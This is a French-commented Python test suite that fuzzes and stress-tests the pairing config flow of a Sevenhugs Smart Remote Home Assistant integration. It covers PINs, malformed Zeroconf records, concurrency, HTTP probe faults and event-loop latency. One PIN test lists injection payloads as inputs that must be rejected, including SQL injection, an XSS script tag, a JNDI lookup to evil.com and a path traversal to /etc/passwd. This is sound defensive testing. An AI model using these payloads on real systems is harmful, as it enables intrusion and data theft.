"""Banc d'épreuves contradictoires et de stress-test pour le Config Flow de Sevenhugs Smart Remote (Phase 2).

Ce banc d'essais valide empiriquement la robustesse du composant sous conditions hostiles :
1. Fuzzing et stress-testing du code PIN :
   - Longueurs limites (0, 1, 7, 9, 10, 100 chiffres).
   - Variations de formatage : espaces multiples, tabulations, sauts de ligne, tirets multiples, non-formaté.
   - Caractères alphabétiques, caractères spéciaux, injections SQL, balises HTML/XSS.
   - Encodages Unicode : chiffres arabes orientaux, chiffres pleine chasse japonais, émojis, octets nuls.
   - Types inattendus (None, entier, liste).
   - Résilience aux échecs répétés et reprise nominale.
2. Découverte Zeroconf avec enregistrements TXT malformés :
   - Numéro de série (sn) manquant.
   - Identifiant télécommande (id) manquant.
   - Enregistrements TXT vides ou nuls.
   - Séquences d'octets UTF-8 invalides (rejet ou remplacement sans crash).
   - Octets nuls et pollution binaire.
   - Valeurs typées non-chaînes (entiers, flottants, booléens).
   - Ports invalides (0, None).
   - Hôtes IPv6.
3. Conditions de concurrence et mise à jour dynamique d'IP :
   - Rafales de découvertes Zeroconf concurrentes pour un même appareil déjà configuré.
   - Découvertes simultanées pour des appareils distincts.
   - Initialisations d'appairage concurrentes.
4. Échecs de sonde HTTP port 80 :
   - Connexion refusée (port fermé).
   - Réinitialisation de connexion TCP (TCP RST / abort).
   - Blocage réseau / timeout (connexion acceptée sans réponse HTTP).
   - Codes de statut HTTP : 404 (toléré), 500 (rejeté), 502/503/504 (rejetés).
   - Noms d'hôtes invalides ou vides.
   - Échecs de sonde lors de la reconfiguration.
5. Latence matérielle non-bloquante de 16 secondes :
   - Absence totale de famine de la boucle d'événements asyncio (gigue maximale < 50ms).
   - Maintien du parallélisme des tâches de fond concurrentes.
   - Exécution simultanée de flux d'appairage sans blocage séquentiel.
   - Annulation propre en cours de requête M1 sans fuite de socket.

Compatible duale : pytest et python3 -m unittest discover tests -v.
"""

from __future__ import annotations

import asyncio
import os
import sys
import time
import unittest
from typing import Any
from unittest.mock import patch

# Assure le chargement de conftest et des shims Home Assistant
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

import tests.conftest
from tests.conftest import MockSmartRemoteServer, aiohttp
from homeassistant.components.zeroconf import ZeroconfServiceInfo
from homeassistant.config_entries import ConfigEntry
from homeassistant.core import HomeAssistant
from homeassistant.data_entry_flow import AbortFlow, FlowResultType

from custom_components.smart_remote_rebirth.config_flow import (
    SevenhugsConfigFlow,
    _decode_prop,
)
from custom_components.smart_remote_rebirth.const import (
    CONF_HOST,
    CONF_PORT,
    CONF_REMOTE_ID,
    CONF_SERIAL_NUMBER,
    CONF_SESSION_READ_KEY,
    CONF_SESSION_WRITE_KEY,
    DEFAULT_PORT,
    DOMAIN,
    ERROR_ALREADY_CONFIGURED,
    ERROR_CANNOT_CONNECT,
    ERROR_INVALID_PIN,
    ERROR_PAIRING_FAILED,
    ERROR_REMOTE_BUSY,
    ERROR_TIMEOUT_CONNECT,
)


class RawTcpFaultServer:
    """Serveur TCP brut pour injecter des fautes réseau de bas niveau sur le port HTTP 80."""

    def __init__(self, behavior: str = "hang", hang_duration: float = 5.0) -> None:
        self.behavior = behavior
        self.hang_duration = hang_duration
        self.server: asyncio.Server | None = None
        self.port: int = 0
        self.host: str = "127.0.0.1"

    async def _handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        if self.behavior == "reset":
            # Force la réinitialisation de connexion TCP
            writer.transport.abort()
            return
        elif self.behavior == "hang":
            try:
                await asyncio.sleep(self.hang_duration)
            except asyncio.CancelledError:
                pass
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
            return
        elif self.behavior == "404":
            try:
                await reader.read(512)
            except Exception:
                pass
            writer.write(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            try:
                await writer.drain()
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        elif self.behavior == "500":
            try:
                await reader.read(512)
            except Exception:
                pass
            writer.write(b"HTTP/1.1 500 Internal Server Error\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            try:
                await writer.drain()
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        elif self.behavior == "503":
            try:
                await reader.read(512)
            except Exception:
                pass
            writer.write(b"HTTP/1.1 503 Service Unavailable\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            try:
                await writer.drain()
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def start(self) -> None:
        self.server = await asyncio.start_server(self._handle_client, self.host, 0)
        self.port = self.server.sockets[0].getsockname()[1]

    async def stop(self) -> None:
        if self.server:
            self.server.close()
            await self.server.wait_closed()


# ============================================================================
# 1. FUZZING ET STRESS DU CODE PIN
# ============================================================================

class TestAdversarialPinFuzzing(unittest.IsolatedAsyncioTestCase):
    """Épreuves contradictoires pour la saisie et validation du code PIN."""

    async def asyncSetUp(self) -> None:
        self.server = MockSmartRemoteServer()
        await self.server.start()

    async def asyncTearDown(self) -> None:
        await self.server.stop()

    async def _init_flow_to_pin_step(self, hass: HomeAssistant | None = None) -> SevenhugsConfigFlow:
        """Initialise un flux jusqu'à l'étape pair_pin."""
        flow = SevenhugsConfigFlow()
        flow.hass = hass or HomeAssistant()
        await flow.async_step_user({CONF_HOST: self.server.host, CONF_PORT: self.server.port})
        await flow.async_step_pair_init({})
        return flow

    async def test_pin_boundary_lengths_rejected(self) -> None:
        """Vérifie le rejet immédiat des codes PIN de longueurs non conformes (doit faire 8 chiffres)."""
        invalid_lengths = [
            "",                        # 0 chiffre
            "1",                       # 1 chiffre
            "12",                      # 2 chiffres
            "1234567",                 # 7 chiffres (frontière basse -1)
            "123456789",               # 9 chiffres (frontière haute +1)
            "1234567890",              # 10 chiffres
            "9" * 50,                  # 50 chiffres
            "1" * 100,                 # 100 chiffres (tentative DoS mémoire)
        ]

        for pin_candidate in invalid_lengths:
            with self.subTest(candidate=pin_candidate[:15]):
                flow = await self._init_flow_to_pin_step()
                try:
                    res = await flow.async_step_pair_pin({"pin": pin_candidate})
                    self.assertEqual(res["type"], FlowResultType.FORM)
                    self.assertEqual(res["step_id"], "pair_pin")
                    self.assertEqual(res["errors"], {"base": ERROR_INVALID_PIN})
                finally:
                    if flow._pair_client:
                        await flow._pair_client.close()

    async def test_pin_whitespace_and_formatting_variants(self) -> None:
        """Vérifie l'acceptation et le reformatage propre de variantes valides à 8 chiffres."""
        valid_variants = [
            "  123-45-678  ",          # Espaces de tête et queue
            " 123 45 678 ",            # Espaces internes
            "\t123\n45\r678 ",         # Tabulations et retours chariot
            "1-2-3-4-5-6-7-8",         # Tirets multiples
            "12345678",                # Chiffres bruts sans séparateur
            "123.45.678",              # Points de séparation
            "123_45_678",              # Soulignés
            "123/45/678",              # Barres obliques
        ]

        for variant in valid_variants:
            with self.subTest(variant=variant):
                # Chaque sous-test utilise une instance HomeAssistant distincte pour éviter already_configured
                fresh_hass = HomeAssistant()
                flow = await self._init_flow_to_pin_step(hass=fresh_hass)
                try:
                    res = await flow.async_step_pair_pin({"pin": variant})
                    self.assertEqual(res["type"], FlowResultType.CREATE_ENTRY)
                    self.assertEqual(res["data"][CONF_SERIAL_NUMBER], "a06fe048b48b260139")
                    self.assertIn(CONF_SESSION_WRITE_KEY, res["data"])
                    self.assertIn(CONF_SESSION_READ_KEY, res["data"])
                finally:
                    if flow._pair_client:
                        await flow._pair_client.close()

    async def test_pin_letters_and_special_chars_rejected(self) -> None:
        """Vérifie le rejet strict des caractères non numériques conduisant à != 8 chiffres."""
        malicious_inputs = [
            "abcdefgh",
            "ABCDEFGH",
            "!@#$%^&*",
            "' OR '1'='1",
            "admin' --",
            "<script>alert(1)</script>",
            "123-45-67a",              # 7 chiffres + 1 lettre (total 7 chiffres)
            "${jndi:ldap://evil.com}",
            "../../../../etc/passwd",
        ]

        for payload in malicious_inputs:
            with self.subTest(payload=payload):
                flow = await self._init_flow_to_pin_step()
                try:
                    res = await flow.async_step_pair_pin({"pin": payload})
                    self.assertEqual(res["type"], FlowResultType.FORM)
                    self.assertEqual(res["step_id"], "pair_pin")
                    self.assertEqual(res["errors"], {"base": ERROR_INVALID_PIN})
                finally:
                    if flow._pair_client:
                        await flow._pair_client.close()

    async def test_pin_extraneous_chars_with_eight_digits(self) -> None:
        """Caractères parasites avec exactement 8 chiffres : re.sub extrait les 8 chiffres."""
        fresh_hass = HomeAssistant()
        flow = await self._init_flow_to_pin_step(hass=fresh_hass)
        try:
            # "123-45-678-x" -> 8 chiffres extraits ("12345678"), valide sur le serveur
            res = await flow.async_step_pair_pin({"pin": "123-45-678-x"})
            self.assertEqual(res["type"], FlowResultType.CREATE_ENTRY)
        finally:
            if flow._pair_client:
                await flow._pair_client.close()

    async def test_pin_unicode_and_null_bytes(self) -> None:
        """Vérifie le comportement face à des chiffres Unicode non-ASCII et octets nuls."""
        flow = await self._init_flow_to_pin_step()
        try:
            # Chiffres arabes orientaux (doivent être rejetés car non ASCII 0-9)
            res = await flow.async_step_pair_pin({"pin": "١٢٣٤٥٦٧٨"})
            self.assertEqual(res["type"], FlowResultType.FORM)
            self.assertEqual(res["errors"], {"base": ERROR_INVALID_PIN})

            # Chiffres pleine chasse (fullwidth)
            res = await flow.async_step_pair_pin({"pin": "１２３４５６７８"})
            self.assertEqual(res["type"], FlowResultType.FORM)
            self.assertEqual(res["errors"], {"base": ERROR_INVALID_PIN})

            # Émojis
            res = await flow.async_step_pair_pin({"pin": "🔒🔑🛡️📱💻⚡✨🌟"})
            self.assertEqual(res["type"], FlowResultType.FORM)
            self.assertEqual(res["errors"], {"base": ERROR_INVALID_PIN})

            # Octet nul embarqué avec 8 chiffres valides (123\x0045678)
            res = await flow.async_step_pair_pin({"pin": "123\x0045-678"})
            self.assertEqual(res["type"], FlowResultType.CREATE_ENTRY)
        finally:
            if flow._pair_client:
                await flow._pair_client.close()

    async def test_pin_unexpected_types_handled_gracefully(self) -> None:
        """Vérifie la robustesse si la clé pin n'est pas une chaîne standard (None, int, liste, dict)."""
        # 1. Dictionnaire vide
        flow1 = await self._init_flow_to_pin_step()
        try:
            res1 = await flow1.async_step_pair_pin({})
            self.assertEqual(res1["type"], FlowResultType.FORM)
            self.assertEqual(res1["errors"], {"base": ERROR_INVALID_PIN})
        finally:
            if flow1._pair_client:
                await flow1._pair_client.close()

        # 2. pin = None
        flow2 = await self._init_flow_to_pin_step()
        try:
            res2 = await flow2.async_step_pair_pin({"pin": None})
            self.assertEqual(res2["type"], FlowResultType.FORM)
            self.assertEqual(res2["errors"], {"base": ERROR_INVALID_PIN})
        finally:
            if flow2._pair_client:
                await flow2._pair_client.close()

        # 3. pin = entier 12345678 (converti en str "12345678", valide)
        flow3 = await self._init_flow_to_pin_step()
        try:
            res3 = await flow3.async_step_pair_pin({"pin": 12345678})
            self.assertEqual(res3["type"], FlowResultType.CREATE_ENTRY)
        finally:
            if flow3._pair_client:
                await flow3._pair_client.close()

    async def test_pin_repeated_failures_then_success(self) -> None:
        """Vérifie qu'une succession de saisies erronées n'altère pas l'état et permet la réussite finale."""
        flow = await self._init_flow_to_pin_step()
        try:
            bad_attempts = ["0000", "999-99-99", "abc", "123-45-6789", ""]
            for attempt in bad_attempts:
                res = await flow.async_step_pair_pin({"pin": attempt})
                self.assertEqual(res["type"], FlowResultType.FORM)
                self.assertEqual(res["errors"], {"base": ERROR_INVALID_PIN})
                self.assertIsNotNone(flow._pair_client, "Le client ne doit pas être fermé sur simple erreur de format")

            # Saisie valide consécutive
            final_res = await flow.async_step_pair_pin({"pin": "123-45-678"})
            self.assertEqual(final_res["type"], FlowResultType.CREATE_ENTRY)
            self.assertEqual(final_res["title"], "Smart Remote (5726)")
        finally:
            if flow._pair_client:
                await flow._pair_client.close()

    async def test_pair_pin_without_active_client(self) -> None:
        """Vérifie qu'appeler pair_pin sans initialisation préalable renvoie cleanly pairing_failed."""
        flow = SevenhugsConfigFlow()
        flow.hass = HomeAssistant()
        res = await flow.async_step_pair_pin({"pin": "123-45-678"})
        self.assertEqual(res["type"], FlowResultType.FORM)
        self.assertEqual(res["step_id"], "pair_pin")
        self.assertEqual(res["errors"], {"base": ERROR_PAIRING_FAILED})


# ============================================================================
# 2. DÉCOUVERTE ZEROCONF AVEC DONNÉES TXT MALFORMÉES
# ============================================================================

class TestAdversarialZeroconf(unittest.IsolatedAsyncioTestCase):
    """Épreuves contradictoires pour la découverte automatique Zeroconf."""

    async def asyncSetUp(self) -> None:
        self.hass = HomeAssistant()

    async def test_zeroconf_missing_sn(self) -> None:
        """Zeroconf sans numéro de série : le flux ne doit pas lever d'exception et afficher 'Inconnu'."""
        flow = SevenhugsConfigFlow()
        flow.hass = self.hass

        discovery = ZeroconfServiceInfo(
            host="192.168.1.150",
            port=80,
            hostname="sr-nosn.local.",
            type="_smart_remote._tcp.local.",
            name="Smart Remote NoSN",
            properties={"id": "5726", "fw": "0.76.4"},
        )

        res = await flow.async_step_zeroconf(discovery)
        self.assertEqual(res["type"], FlowResultType.FORM)
        self.assertEqual(res["step_id"], "zeroconf_confirm")
        self.assertEqual(res["description_placeholders"]["sn"], "Inconnu")
        self.assertIsNone(flow.unique_id)
        self.assertEqual(flow.serial_number, "")

    async def test_zeroconf_missing_id(self) -> None:
        """Zeroconf sans 'id' : le flux doit utiliser le repli 'Sevenhugs' sans planter."""
        flow = SevenhugsConfigFlow()
        flow.hass = self.hass

        discovery = ZeroconfServiceInfo(
            host="192.168.1.151",
            port=80,
            hostname="sr-noid.local.",
            type="_smart_remote._tcp.local.",
            name="Smart Remote NoID",
            properties={"sn": "a06fe048b48b"},
        )

        res = await flow.async_step_zeroconf(discovery)
        self.assertEqual(res["type"], FlowResultType.FORM)
        self.assertEqual(res["step_id"], "zeroconf_confirm")
        self.assertIn("Sevenhugs", res["description_placeholders"]["name"])
        self.assertEqual(flow.unique_id, "a06fe048b48b")

    async def test_zeroconf_empty_and_none_properties(self) -> None:
        """Zeroconf avec dictionnaire de propriétés vide ou None."""
        for props in [{}, None]:
            with self.subTest(properties=props):
                flow = SevenhugsConfigFlow()
                flow.hass = self.hass

                discovery = ZeroconfServiceInfo(
                    host="192.168.1.152",
                    port=80,
                    hostname="sr-empty.local.",
                    type="_smart_remote._tcp.local.",
                    name="Smart Remote Empty",
                    properties=props,
                )

                res = await flow.async_step_zeroconf(discovery)
                self.assertEqual(res["type"], FlowResultType.FORM)
                self.assertEqual(res["step_id"], "zeroconf_confirm")
                self.assertEqual(res["description_placeholders"]["sn"], "Inconnu")

    async def test_zeroconf_malformed_utf8_in_properties(self) -> None:
        """Zeroconf avec séquences UTF-8 corrompues : remplacement sans lever UnicodeDecodeError."""
        flow = SevenhugsConfigFlow()
        flow.hass = self.hass

        discovery = ZeroconfServiceInfo(
            host="192.168.1.153",
            port=80,
            hostname="sr-badutf8.local.",
            type="_smart_remote._tcp.local.",
            name="Smart Remote BadUTF8",
            properties={
                b"sn": b"\xff\xfe\x80\x00sn_corrupted",
                b"id": b"\x80\x81id_bad",
                b"fw": b"\xc3\x28bad_continuation",
            },
        )

        res = await flow.async_step_zeroconf(discovery)
        self.assertEqual(res["type"], FlowResultType.FORM)
        self.assertIn("\ufffd", flow.serial_number)
        self.assertIn("\ufffd", flow.remote_id)

    async def test_zeroconf_null_bytes_in_properties(self) -> None:
        """Zeroconf avec octets nuls intégrés dans les valeurs."""
        flow = SevenhugsConfigFlow()
        flow.hass = self.hass

        discovery = ZeroconfServiceInfo(
            host="192.168.1.154",
            port=80,
            hostname="sr-nullbytes.local.",
            type="_smart_remote._tcp.local.",
            name="Smart Remote NullBytes",
            properties={
                b"sn": b"sn\x00with\x00nulls",
                b"id": b"id\x005726",
            },
        )

        res = await flow.async_step_zeroconf(discovery)
        self.assertEqual(res["type"], FlowResultType.FORM)
        self.assertIn("\x00", flow.serial_number)
        self.assertEqual(flow.unique_id, "sn\x00with\x00nulls")

    async def test_zeroconf_typed_and_non_ascii_properties(self) -> None:
        """Zeroconf avec entiers, flottants, booléens et clés non-ASCII."""
        flow = SevenhugsConfigFlow()
        flow.hass = self.hass

        discovery = ZeroconfServiceInfo(
            host="192.168.1.155",
            port=80,
            hostname="sr-typed.local.",
            type="_smart_remote._tcp.local.",
            name="Smart Remote Typed",
            properties={
                "sn": 123456789,
                "id": 5726,
                "fw": 0.76,
                "binaire": True,
                "nul": None,
                "donnée_accentuée": "valeur_éè",
            },
        )

        res = await flow.async_step_zeroconf(discovery)
        self.assertEqual(res["type"], FlowResultType.FORM)
        self.assertEqual(flow.serial_number, "123456789")
        self.assertEqual(flow.remote_id, "5726")
        self.assertEqual(flow.fw_version, "0.76")

    async def test_zeroconf_port_zero_or_none(self) -> None:
        """Zeroconf avec port égal à 0 ou None : repli immédiat sur DEFAULT_PORT (80)."""
        for bad_port in [0, None]:
            with self.subTest(port=bad_port):
                flow = SevenhugsConfigFlow()
                flow.hass = self.hass

                discovery = ZeroconfServiceInfo(
                    host="192.168.1.156",
                    port=bad_port,
                    hostname="sr-port0.local.",
                    type="_smart_remote._tcp.local.",
                    name="Smart Remote Port0",
                    properties={"sn": "test_port_0"},
                )

                await flow.async_step_zeroconf(discovery)
                self.assertEqual(flow.port, DEFAULT_PORT)


# ============================================================================
# 3. CONCURRENCE ET MISES À JOUR DYNAMIQUES D'IP
# ============================================================================

class TestAdversarialRaceConditions(unittest.IsolatedAsyncioTestCase):
    """Épreuves contradictoires de concurrence sur les flux Zeroconf et ConfigFlow."""

    async def asyncSetUp(self) -> None:
        self.hass = HomeAssistant()

    async def test_concurrent_zeroconf_same_device_ip_updates(self) -> None:
        """Salve de 15 découvertes Zeroconf concurrentes pour une même télécommande déjà configurée.

        Vérifie :
        - Toutes les tâches avortent proprement avec already_configured.
        - Zéro exception d'état ou corruption du registre.
        - L'entrée unique est mise à jour avec l'une des nouvelles adresses IP sans duplication.
        """
        initial_sn = "sn_concurrency_race_123"
        existing_entry = ConfigEntry(
            entry_id="entry_concurrency_test",
            domain=DOMAIN,
            title="Sevenhugs Smart Remote",
            data={CONF_HOST: "192.168.1.10", CONF_PORT: 80, CONF_SERIAL_NUMBER: initial_sn},
            unique_id=initial_sn,
        )
        self.hass.config_entries.async_add(existing_entry)

        async def run_discovery(index: int) -> str | Exception:
            flow = SevenhugsConfigFlow()
            flow.hass = self.hass
            discovery = ZeroconfServiceInfo(
                host=f"192.168.1.{100 + index}",
                port=80,
                hostname="sr.local.",
                type="_smart_remote._tcp.local.",
                name="Smart Remote",
                properties={"id": "5726", "sn": initial_sn, "fw": "0.76.4"},
            )
            try:
                await flow.async_step_zeroconf(discovery)
                return "completed"
            except AbortFlow as e:
                return e.reason
            except Exception as e:
                return e

        results = await asyncio.gather(*[run_discovery(i) for i in range(15)], return_exceptions=True)

        for idx, res in enumerate(results):
            self.assertEqual(res, "already_configured", f"La tâche {idx} a échoué avec: {res}")

        # Laisser et attendre que toutes les tâches async_reload de fond se terminent
        pending = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
        if pending:
            await asyncio.gather(*pending, return_exceptions=True)

        # Vérification qu'il n'y a toujours qu'une seule entrée et que son hôte a été mis à jour
        entries = self.hass.config_entries.async_entries(DOMAIN)
        self.assertEqual(len(entries), 1)
        self.assertTrue(entries[0].data[CONF_HOST].startswith("192.168.1.1"))

    async def test_concurrent_zeroconf_different_devices(self) -> None:
        """Découverte concurrente de 10 périphériques distincts sans interférence croisée."""
        async def discover_device(index: int) -> dict[str, Any]:
            flow = SevenhugsConfigFlow()
            flow.hass = self.hass
            sn = f"distinct_sn_{index:03d}"
            host = f"10.0.0.{index + 1}"
            discovery = ZeroconfServiceInfo(
                host=host,
                port=80,
                hostname=f"sr-{index}.local.",
                type="_smart_remote._tcp.local.",
                name=f"Smart Remote {index}",
                properties={"id": str(1000 + index), "sn": sn, "fw": "0.76.4"},
            )
            res = await flow.async_step_zeroconf(discovery)
            return {"result": res, "flow_host": flow.host, "flow_sn": flow.serial_number, "unique_id": flow.unique_id}

        results = await asyncio.gather(*[discover_device(i) for i in range(10)])

        for idx, data in enumerate(results):
            self.assertEqual(data["result"]["type"], FlowResultType.FORM)
            self.assertEqual(data["result"]["step_id"], "zeroconf_confirm")
            self.assertEqual(data["flow_host"], f"10.0.0.{idx + 1}")
            self.assertEqual(data["flow_sn"], f"distinct_sn_{idx:03d}")
            self.assertEqual(data["unique_id"], f"distinct_sn_{idx:03d}")


# ============================================================================
# 4. ÉCHECS DE SONDE HTTP PORT 80 (_async_probe_host)
# ============================================================================

class TestAdversarialPort80Probe(unittest.IsolatedAsyncioTestCase):
    """Épreuves contradictoires pour la validation préliminaire de connectivité port 80."""

    async def asyncSetUp(self) -> None:
        self.hass = HomeAssistant()

    async def test_probe_connection_refused(self) -> None:
        """Connexion refusée (port fermé) : renvoie proprement cannot_connect sans lever d'exception."""
        flow = SevenhugsConfigFlow()
        flow.hass = self.hass

        # Port local garanti fermé (59999)
        res = await flow.async_step_user({CONF_HOST: "127.0.0.1", CONF_PORT: 59999})
        self.assertEqual(res["type"], FlowResultType.FORM)
        self.assertEqual(res["step_id"], "user")
        self.assertEqual(res["errors"], {"base": ERROR_CANNOT_CONNECT})

    async def test_probe_connection_reset(self) -> None:
        """Réinitialisation de connexion TCP brutale (RST/abort) : capturée proprement en cannot_connect."""
        server = RawTcpFaultServer(behavior="reset")
        await server.start()
        try:
            flow = SevenhugsConfigFlow()
            flow.hass = self.hass

            res = await flow.async_step_user({CONF_HOST: server.host, CONF_PORT: server.port})
            self.assertEqual(res["type"], FlowResultType.FORM)
            self.assertEqual(res["step_id"], "user")
            self.assertEqual(res["errors"], {"base": ERROR_CANNOT_CONNECT})
        finally:
            await server.stop()

    async def test_probe_connection_hang_timeout(self) -> None:
        """Blocage réseau silencieux (hang) : expiration de timeout capturée sans bloquer."""
        server = RawTcpFaultServer(behavior="hang", hang_duration=2.0)
        await server.start()
        try:
            flow = SevenhugsConfigFlow()
            flow.hass = self.hass

            # Patch temporaire de TIMEOUT_CONNECT_CHECK à 0.15s pour un test unitaire ultra-rapide
            with patch("custom_components.smart_remote_rebirth.config_flow.TIMEOUT_CONNECT_CHECK", 0.15):
                start = time.monotonic()
                res = await flow.async_step_user({CONF_HOST: server.host, CONF_PORT: server.port})
                duration = time.monotonic() - start

                self.assertLess(duration, 1.0, f"Le timeout de sonde a trop tardé: {duration}s")
                self.assertEqual(res["type"], FlowResultType.FORM)
                self.assertEqual(res["step_id"], "user")
                self.assertEqual(res["errors"], {"base": ERROR_CANNOT_CONNECT})
        finally:
            await server.stop()

    async def test_probe_http_status_codes(self) -> None:
        """Vérifie la distinction stricte entre statuts HTTP autorisés (200, 204, 404) et rejetés (500, 503)."""
        # 1. HTTP 404 sur /api/hello (toléré car atteste d'un serveur actif sur la télécommande)
        server_404 = RawTcpFaultServer(behavior="404")
        await server_404.start()
        try:
            flow = SevenhugsConfigFlow()
            flow.hass = self.hass
            res = await flow.async_step_user({CONF_HOST: server_404.host, CONF_PORT: server_404.port})
            self.assertEqual(res["type"], FlowResultType.FORM)
            self.assertEqual(res["step_id"], "pair_init", "Le statut 404 doit être accepté comme preuve de vie HTTP")
        finally:
            await server_404.stop()

        # 2. HTTP 500 sur /api/hello (rejeté -> cannot_connect)
        server_500 = RawTcpFaultServer(behavior="500")
        await server_500.start()
        try:
            flow = SevenhugsConfigFlow()
            flow.hass = self.hass
            res = await flow.async_step_user({CONF_HOST: server_500.host, CONF_PORT: server_500.port})
            self.assertEqual(res["type"], FlowResultType.FORM)
            self.assertEqual(res["step_id"], "user")
            self.assertEqual(res["errors"], {"base": ERROR_CANNOT_CONNECT})
        finally:
            await server_500.stop()

        # 3. HTTP 503 sur /api/hello (rejeté -> cannot_connect)
        server_503 = RawTcpFaultServer(behavior="503")
        await server_503.start()
        try:
            flow = SevenhugsConfigFlow()
            flow.hass = self.hass
            res = await flow.async_step_user({CONF_HOST: server_503.host, CONF_PORT: server_503.port})
            self.assertEqual(res["type"], FlowResultType.FORM)
            self.assertEqual(res["step_id"], "user")
            self.assertEqual(res["errors"], {"base": ERROR_CANNOT_CONNECT})
        finally:
            await server_503.stop()

    async def test_probe_invalid_hostnames(self) -> None:
        """Hôtes syntaxiquement invalides ou vides : rejet immédiat en cannot_connect."""
        invalid_hosts = ["", "   ", "this_is_an_unresolvable_dummy_host_99999.local"]
        for host in invalid_hosts:
            with self.subTest(host=host):
                flow = SevenhugsConfigFlow()
                flow.hass = self.hass
                res = await flow.async_step_user({CONF_HOST: host, CONF_PORT: 80})
                self.assertEqual(res["type"], FlowResultType.FORM)
                self.assertEqual(res["step_id"], "user")
                self.assertEqual(res["errors"], {"base": ERROR_CANNOT_CONNECT})


# ============================================================================
# 5. LATENCE MATÉRIELLE NON-BLOQUANTE ET GESTION DE L'EVENT LOOP
# ============================================================================

class TestAdversarialLatencyAndEventLoop(unittest.IsolatedAsyncioTestCase):
    """Épreuves contradictoires pour la latence matérielle M1 (~16s) et l'intégrité de la boucle asyncio."""

    async def test_non_blocking_hardware_latency_event_loop_unstarved(self) -> None:
        """Vérifie empiriquement que le délai de calcul M1 ne bloque jamais l'Event Loop (gigue < 50ms)."""
        m1_delay = 0.35  # Simulation substantielle du délai de calcul M1
        server = MockSmartRemoteServer(pair_setup_delay=m1_delay)
        await server.start()
        try:
            hass = HomeAssistant()
            flow = SevenhugsConfigFlow()
            flow.hass = hass
            flow.host = server.host
            flow.port = server.port

            # Moniteur haute fréquence de réactivité de l'Event Loop (cadencé à 5ms)
            ticks = 0
            max_jitter = 0.0
            last_tick_time = time.monotonic()
            stop_monitor = False

            async def event_loop_monitor() -> None:
                nonlocal ticks, max_jitter, last_tick_time
                while not stop_monitor:
                    await asyncio.sleep(0.005)
                    now = time.monotonic()
                    delta = now - last_tick_time
                    last_tick_time = now
                    ticks += 1
                    if delta > max_jitter:
                        max_jitter = delta

            monitor_task = asyncio.create_task(event_loop_monitor())

            start_time = time.monotonic()
            res = await flow.async_step_pair_init({})
            elapsed = time.monotonic() - start_time

            stop_monitor = True
            await monitor_task

            # Vérifications empiriques strictes
            self.assertGreaterEqual(elapsed, m1_delay * 0.9, "Le délai M1 doit avoir été respecté")
            self.assertGreaterEqual(ticks, 25, f"L'Event Loop a été gelée (seulement {ticks} ticks enregistrés)")
            self.assertLess(max_jitter, 0.10, f"Famine détectée sur l'Event Loop : gigue maximale={max_jitter*1000:.1f}ms")

            self.assertEqual(res["type"], FlowResultType.FORM)
            self.assertEqual(res["step_id"], "pair_pin")
            if flow._pair_client:
                await flow._pair_client.close()
        finally:
            await server.stop()

    async def test_concurrent_background_tasks_unaffected_during_m1(self) -> None:
        """Vérifie que 10 tâches de fond concurrentes continuent de s'exécuter à pleine vitesse pendant M1."""
        server = MockSmartRemoteServer(pair_setup_delay=0.30)
        await server.start()
        try:
            hass = HomeAssistant()
            flow = SevenhugsConfigFlow()
            flow.hass = hass
            flow.host = server.host
            flow.port = server.port

            # Lancement de 10 coroutines de fond indépendantes
            task_progress = [0] * 10

            async def background_worker(worker_id: int) -> None:
                for _ in range(15):
                    await asyncio.sleep(0.01)
                    task_progress[worker_id] += 1

            workers = [asyncio.create_task(background_worker(i)) for i in range(10)]

            # Exécution de pair_init pendant que les 10 travailleurs tournent
            res = await flow.async_step_pair_init({})

            await asyncio.gather(*workers)

            for idx, count in enumerate(task_progress):
                self.assertEqual(count, 15, f"Le travailleur {idx} a été étranglé par pair_init (count={count}/15)")

            self.assertEqual(res["type"], FlowResultType.FORM)
            if flow._pair_client:
                await flow._pair_client.close()
        finally:
            await server.stop()

    async def test_parallel_pair_init_speed(self) -> None:
        """Vérifie que 4 flux d'appairage distincts s'exécutent en parallèle et non séquentiellement."""
        m1_delay = 0.25
        server = MockSmartRemoteServer(pair_setup_delay=m1_delay)
        await server.start()
        try:
            hass = HomeAssistant()

            async def run_pair_init(idx: int) -> SevenhugsConfigFlow:
                f = SevenhugsConfigFlow()
                f.hass = hass
                f.host = server.host
                f.port = server.port
                res = await f.async_step_pair_init({})
                self.assertEqual(res["type"], FlowResultType.FORM)
                return f

            start = time.monotonic()
            flows = await asyncio.gather(*[run_pair_init(i) for i in range(4)])
            total_duration = time.monotonic() - start

            # Si l'exécution était séquentielle, cela prendrait 4 * 0.25s = 1.0s.
            # En parallèle, cela doit prendre ~0.25s - 0.45s max.
            self.assertLess(total_duration, 0.70, f"Exécution séquentielle suspectée: {total_duration:.2f}s pour 4 flux")

            for f in flows:
                if f._pair_client:
                    await f._pair_client.close()
        finally:
            await server.stop()

    async def test_flow_cancellation_during_m1_in_flight(self) -> None:
        """Vérifie que l'annulation d'un flux alors que M1 est en cours ne lève pas d'exception non gérée."""
        server = MockSmartRemoteServer(pair_setup_delay=1.0)
        await server.start()
        try:
            hass = HomeAssistant()
            flow = SevenhugsConfigFlow()
            flow.hass = hass
            flow.host = server.host
            flow.port = server.port

            flow_task = asyncio.create_task(flow.async_step_pair_init({}))
            await asyncio.sleep(0.05)  # Laisse le temps à la requête M1 de partir

            # Annulation en vol
            flow_task.cancel()

            with self.assertRaises(asyncio.CancelledError):
                await flow_task
        finally:
            await server.stop()


if __name__ == "__main__":
    unittest.main()
